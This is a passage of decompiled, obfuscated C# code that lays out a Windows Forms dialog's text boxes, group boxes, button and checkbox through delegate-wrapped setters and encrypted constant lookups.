		Delegate68.smethod_0(label_5, (byte)Class3.smethod_0(796) != 0);
		Delegate40.smethod_0(label_5, Delegate98.smethod_0());
		Delegate66.smethod_0(label_5, new Point(Class3.smethod_0(800), Class3.smethod_0(804)));
		Delegate105.smethod_1(label_5, Class4.smethod_0(1167));
		Delegate97.smethod_0(label_5, new Size(Class3.smethod_0(808), Class3.smethod_0(812)));
		Delegate20.smethod_0(label_5, Class3.smethod_0(816));
		Delegate47.smethod_0(label_5, Class4.smethod_0(1180));
		Delegate90.smethod_0(textBox_0, Delegate0.smethod_0());
		Delegate40.smethod_0(textBox_0, Delegate75.smethod_0(Class3.smethod_0(820), Class3.smethod_0(824), Class3.smethod_0(828)));
		Delegate66.smethod_0(textBox_0, new Point(Class3.smethod_0(832), Class3.smethod_0(836)));
		Delegate105.smethod_1(textBox_0, Class4.smethod_0(1197));
		Delegate97.smethod_0(textBox_0, new Size(Class3.smethod_0(840), Class3.smethod_0(844)));
		Delegate20.smethod_0(textBox_0, Class3.smethod_0(848));
		Delegate47.smethod_0(textBox_0, Class4.smethod_0(1214));
		Delegate46.smethod_0(textBox_0, method_10);
		Delegate90.smethod_0(textBox_1, Delegate0.smethod_0());
		Delegate40.smethod_0(textBox_1, Delegate75.smethod_0(Class3.smethod_0(852), Class3.smethod_0(856), Class3.smethod_0(860)));
		Delegate66.smethod_0(textBox_1, new Point(Class3.smethod_0(864), Class3.smethod_0(868)));
		Delegate105.smethod_1(textBox_1, Class4.smethod_0(1279));
		Delegate97.smethod_0(textBox_1, new Size(Class3.smethod_0(872), Class3.smethod_0(876)));
		Delegate20.smethod_0(textBox_1, Class3.smethod_0(880));
		Delegate47.smethod_0(textBox_1, Class4.smethod_0(1296));
		Delegate46.smethod_0(textBox_1, method_9);
		Delegate90.smethod_0(textBox_2, Delegate0.smethod_0());
		Delegate40.smethod_0(textBox_2, Delegate75.smethod_0(Class3.smethod_0(884), Class3.smethod_0(888), Class3.smethod_0(892)));
		Delegate66.smethod_0(textBox_2, new Point(Class3.smethod_0(896), Class3.smethod_0(900)));
		Delegate105.smethod_1(textBox_2, Class4.smethod_0(1411));
		Delegate97.smethod_0(textBox_2, new Size(Class3.smethod_0(904), Class3.smethod_0(908)));
		Delegate20.smethod_0(textBox_2, Class3.smethod_0(912));
		Delegate47.smethod_0(textBox_2, Class4.smethod_0(1428));
		Delegate46.smethod_0(textBox_2, method_8);
		Delegate90.smethod_0(textBox_3, Delegate0.smethod_0());
		Delegate40.smethod_0(textBox_3, Delegate75.smethod_0(Class3.smethod_0(916), Class3.smethod_0(920), Class3.smethod_0(924)));
		Delegate66.smethod_0(textBox_3, new Point(Class3.smethod_0(928), Class3.smethod_0(932)));
		Delegate83.smethod_0(textBox_3, (byte)Class3.smethod_0(936) != 0);
		Delegate105.smethod_1(textBox_3, Class4.smethod_0(1521));
		Delegate97.smethod_0(textBox_3, new Size(Class3.smethod_0(940), Class3.smethod_0(944)));
		Delegate20.smethod_0(textBox_3, Class3.smethod_0(948));
		Delegate47.smethod_0(textBox_3, Delegate117.smethod_0(object_, Class4.smethod_0(1538)));
		Delegate46.smethod_0(textBox_3, method_7);
		Delegate90.smethod_0(textBox_4, Delegate0.smethod_0());
		Delegate40.smethod_0(textBox_4, Delegate75.smethod_0(Class3.smethod_0(952), Class3.smethod_0(956), Class3.smethod_0(960)));
		Delegate66.smethod_0(textBox_4, new Point(Class3.smethod_0(964), Class3.smethod_0(968)));
		Delegate105.smethod_1(textBox_4, Class4.smethod_0(1565));
		Delegate97.smethod_0(textBox_4, new Size(Class3.smethod_0(972), Class3.smethod_0(976)));
		Delegate20.smethod_0(textBox_4, Class3.smethod_0(980));
		Delegate47.smethod_0(textBox_4, Class4.smethod_0(1582));
		Delegate46.smethod_0(textBox_4, method_6);
		Delegate77.smethod_0(button_0, (FlatStyle)Class3.smethod_0(984));
		Delegate40.smethod_0(button_0, Delegate8.smethod_0());
		Delegate66.smethod_0(button_0, new Point(Class3.smethod_0(988), Class3.smethod_0(992)));
		Delegate105.smethod_1(button_0, Class4.smethod_0(1667));
		Delegate97.smethod_0(button_0, new Size(Class3.smethod_0(996), Class3.smethod_0(1000)));
		Delegate20.smethod_0(button_0, Class3.smethod_0(1004));
		Delegate47.smethod_0(button_0, Class4.smethod_0(1682));
		Delegate74.smethod_0(button_0, (byte)Class3.smethod_0(1008) != 0);
		Delegate19.smethod_0(button_0, method_1);
		Delegate66.smethod_0(groupBox_1, new Point(Class3.smethod_0(1012), Class3.smethod_0(1016)));
		Delegate105.smethod_1(groupBox_1, Class4.smethod_0(1713));
		Delegate97.smethod_0(groupBox_1, new Size(Class3.smethod_0(1020), Class3.smethod_0(1024)));
		Delegate20.smethod_0(groupBox_1, Class3.smethod_0(1028));
		Delegate52.smethod_0(groupBox_1, (byte)Class3.smethod_0(1032) != 0);
		Delegate66.smethod_0(groupBox_2, new Point(Class3.smethod_0(1036), Class3.smethod_0(1040)));
		Delegate105.smethod_1(groupBox_2, Class4.smethod_0(1732));
		Delegate97.smethod_0(groupBox_2, new Size(Class3.smethod_0(1044), Class3.smethod_0(1048)));
		Delegate20.smethod_0(groupBox_2, Class3.smethod_0(1052));
		Delegate52.smethod_0(groupBox_2, (byte)Class3.smethod_0(1056) != 0);
		Delegate66.smethod_0(groupBox_3, new Point(Class3.smethod_0(1060), Class3.smethod_0(1064)));
		Delegate105.smethod_1(groupBox_3, Class4.smethod_0(1751));
		Delegate97.smethod_0(groupBox_3, new Size(Class3.smethod_0(1068), Class3.smethod_0(1072)));
		Delegate20.smethod_0(groupBox_3, Class3.smethod_0(1076));
		Delegate52.smethod_0(groupBox_3, (byte)Class3.smethod_0(1080) != 0);
		Delegate66.smethod_0(groupBox_4, new Point(Class3.smethod_0(1084), Class3.smethod_0(1088)));
		Delegate105.smethod_1(groupBox_4, Class4.smethod_0(1770));
		Delegate97.smethod_0(groupBox_4, new Size(Class3.smethod_0(1092), Class3.smethod_0(1096)));
		Delegate20.smethod_0(groupBox_4, Class3.smethod_0(1100));
		Delegate52.smethod_0(groupBox_4, (byte)Class3.smethod_0(1104) != 0);
		Delegate68.smethod_0(checkBox_0, (byte)Class3.smethod_0(1108) != 0);
		Delegate66.smethod_0(checkBox_0, new Point(Class3.smethod_0(1112), Class3.smethod_0(1116)));
		Delegate105.smethod_1(checkBox_0, Class4.smethod_0(1789));
		Delegate97.smethod_0(checkBox_0, new Size(Class3.smethod_0(1120), Class3.smethod_0(1124)));
		Delegate20.smethod_0(checkBox_0, Class3.smethod_0(1128));
		Delegate47.smethod_0(checkBox_0, Class4.smethod_0(1808));
		Delegate74.smethod_0(checkBox_0, (byte)Class3.smethod_0(1132) != 0);
		Delegate4.smethod_0(this, new SizeF(Class3.smethod_2(1136), Class3.smethod_2(1140)));
		Delegate110.smethod_0(this, (AutoScaleMode)Class3.smethod_0(1144));
		Delegate90.smethod_0(this, Delegate0.smethod_0());
		Delegate59.smethod_0(this, new Size(Class3.smethod_0(1148), Class3.smethod_0(1152)));
		Delegate38.smethod_0(Delegate82.smethod_0(this), (Control)(object)checkBox_0);
		Delegate38.smethod_0(Delegate82.smethod_0(this), (Control)(object)groupBox_4);
		Delegate38.smethod_0(Delegate82.smethod_0(this), (Control)(object)groupBox_3);
		Delegate38.smethod_0(Delegate82.smethod_0(this), (Control)(object)groupBox_2);
		Delegate38.smethod_0(Delegate82.smethod_0(this), (Control)(object)groupBox_1);
		Delegate38.smethod_0(Delegate82.smethod_0(this), (Control)(object)button_0);
		Delegate38.smethod_0(Delegate82.smethod_0(this), (Control)(object)groupBox_0);
		Delegate38.smethod_0(Delegate82.smethod_0(this), (Control)(object)label_0);
		Delegate40.smethod_0(this, Delegate8.smethod_0());
		Delegate18.smethod_0(this, (Icon)Delegate26.smethod_0(object_, Class4.smethod_0(1925)));
		Delegate105.smethod_0(this, Class4.smethod_0(1946));
		Delegate61.smethod_0(this, (FormStartPosition)Class3.smethod_0(1156));
		Delegate47.smethod_0(this, Class4.smethod_0(1957));
		Delegate32.smethod_0(this, method_4);
		Delegate13.smethod_1(groupBox_0, (byte)Class3.smethod_0(1160) != 0);
		Delegate48.smethod_1(groupBox_0);
		Delegate13.smethod_0(this, (byte)Class3.smethod_0(1164) != 0);
		Delegate48.smethod_0(this);
	}
}
